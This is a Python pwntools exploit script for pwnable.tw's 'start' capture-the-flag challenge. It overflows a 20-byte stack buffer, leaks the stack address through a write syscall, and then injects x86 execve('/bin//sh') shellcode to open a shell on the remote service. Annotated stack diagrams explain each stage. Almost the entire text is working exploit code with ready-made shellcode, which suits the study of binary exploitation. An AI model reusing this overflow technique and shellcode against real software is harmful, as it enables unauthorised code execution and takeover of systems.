# write(1,"Let's start the CTF:",20);
# read(0,buf,60);

# avaliable space is 0x14 < 0x3c, overflow it from stdin!

from pwn import *

def  makeShellcode():
    # sys_execve(): 0xb program in int 80h.
    code  ='''
    xor ecx,ecx
    mul ecx
    push eax
    push 0x68732F2F   ;push //bash
    push 0x6E69622F   ;push /bin
    mov ebx,esp
    mov al,0x0B       ;function 0xb(11)
    int 0x80          ;system call
    '''
    context(arch='x86', os='linux', endian='little', word_size=32)
    shellcode  =  asm(code).encode('hex')
    print shellcode
    # \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
    return shellcode

shellcode = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

p = remote('chall.pwnable.tw',10000)

p.recvuntil(':')
# before accepting the user input
'''
             H +----------------+
               |     oldesp     |
               +----------------+
               |     _exit      |    <--- retaddr
               +----------------+    <---
               |      CTF:      |      |
               +----------------+      |
               |      the       |      |
               +----------------+      |
               |      art       |    0x14 bytes
               +----------------+      |  
               |      s st      |      |
               +----------------+      |
               |      Let'      |      |
ESP/ECX ---> L +----------------+    <---
'''
print '\x90'*0x14 + p32(0x08048087)
p.send('\x90'*0x14 + p32(0x08048087))
leak_esp = u32(p.recv(4))
# We can only upload shellcode in the stack, so we need to know the exact stack addr
# Due to ASLR, stack addr is random so needs to be leaked
# Here use the sys_write to print out the leak stack addr using ecx which is the buf param.
'''
oldesp --->  H +----------------+ 
               |     oldesp     |    <--- oldesp = leak_esp
               +----------------+ 
               |   0x8048087    |                   <---
               +----------------+    <---             |
               |      aaaa      |      |              |
               +----------------+      |              |
               |      aaaa      |      |              |
               +----------------+      |          payload 1
               |      aaaa      |    0x14 bytes       |
               +----------------+      |              |
               |      aaaa      |      |              |
               +----------------+      |              |
               |      aaaa      |      |              |
              L +----------------+    <---          <---
'''
p.send('\x90'*0x14 + p32(leak_esp+0x14) + shellcode)
'''
             H +----------------+
               |   shellcode    |   shellcode read direction: from this addr to HIGHER addr.
               +----------------+   <--- shellcode_addr = oldesp+0x14                               <---
               | shellcode_addr |   <--- origin retaddr _exit                                         |
               +----------------+   <--- second sys_write <= add esp, 0x14      ;esp + 0x14           |
               |                |                                                                     |
               +----------------+                                                                 payload 2
               |                |                                                                     |
               +----------------+                                                                     |
               |                |                                                                     |
               +----------------+                                                                     |
               |                |                                                                     |
oldesp --->    +----------------+                                                                     |
               |                |                                                                     |
               +----------------+                                                                   <---
               |  oldesp + 0x14 |
               +----------------+    <---
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |    0x14 bytes
               +----------------+      |  
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |      |
             L +----------------+    <---
'''
# raw_input()
# gdb attach <pid>
p.interactive()